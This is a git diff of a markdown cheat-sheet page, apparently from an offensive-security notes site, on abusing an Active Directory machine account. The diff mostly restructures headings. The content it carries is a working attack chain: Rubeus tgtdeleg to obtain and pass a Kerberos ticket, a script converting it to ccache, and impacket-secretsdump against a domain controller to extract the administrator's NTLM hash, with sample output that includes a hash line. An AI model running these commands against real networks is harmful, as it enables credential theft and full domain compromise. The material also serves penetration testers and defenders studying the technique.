@@ -1,14 +1,16 @@
 ---
 title: "Machine Account"
-tags: ["Kerberos", "Credential Dumping", "Pass-The-Ticket", "Rubeus", "Ticket Granting Ticket", "Domain Controller", "Machine Account", "Microsoft Virtual Account", "Active Directory", "Windows"]
+tags: ["Active Directory", "Machine Account", "Credential Dumping", "Domain Controller", "Kerberos", "Microsoft Virtual Account", "Pass-The-Ticket", "Rubeus", "Ticket Granting Ticket", "Windows"]
 ---
 
-### Abuse #1: Microsoft Virtual Account
+{{< filter_buttons >}}
 
-#### 1. Create a Ticket from Microsoft Virtual Account
+### Microsoft Virtual Account
 
 {{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+
+#### 1. Create a Ticket from Microsoft Virtual Account
 
 ```console
 .\rubeus.exe tgtdeleg /nowrap /ptt
@@ -42,15 +44,7 @@ PS C:\programdata> .\rubeus.exe tgtdeleg /nowrap /ptt
       doIFVDCCBV ---[SNIP]--- lHSFQuSFRC
 ```
 
-{{< /tabcontent >}}
-
-#### 2. Secrets Dump
-
-{{< tab set2 tab1 >}}Linux{{< /tab >}}
-{{< tab set2 tab2 >}}Windows{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
-
-#### 1. Convert kirbi to ccache
+#### 2. Convert kirbi to ccache
 
 ```console
 python3 rubeustoccache.py '<BASE64_TICKET>' secrets.kirbi secrets.ccache
@@ -70,7 +64,7 @@ $ python3 rubeustoccache.py 'doIFVDCCBV ---[SNIP]--- lHSFQuSFRC' secrets.kirbi s
 [*] All done! Don't forget to set your environment variable: export KRB5CCNAME=secrets.ccache
 ```
 
-#### 2. Secrets Dump
+#### 3. Secrets Dump
 
 ```console
 export KRB5CCNAME=secrets.ccache
@@ -81,6 +75,7 @@ $ export KRB5CCNAME=secrets.ccache
 ```
 
 ```console
+# Ticket-based Kerberos
 sudo ntpdate -s <DC_IP> && impacket-secretsdump <TARGET> -k -no-pass -just-dc-user administrator
 ```
 
@@ -97,14 +92,5 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c
 ```
 
 <small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
-
-{{< /tabcontent >}}
-{{< tabcontent set2 tab2 >}}
-
-#### 1. TO-DO
-
-```console
-TO-DO
-```
 
 {{< /tabcontent >}}
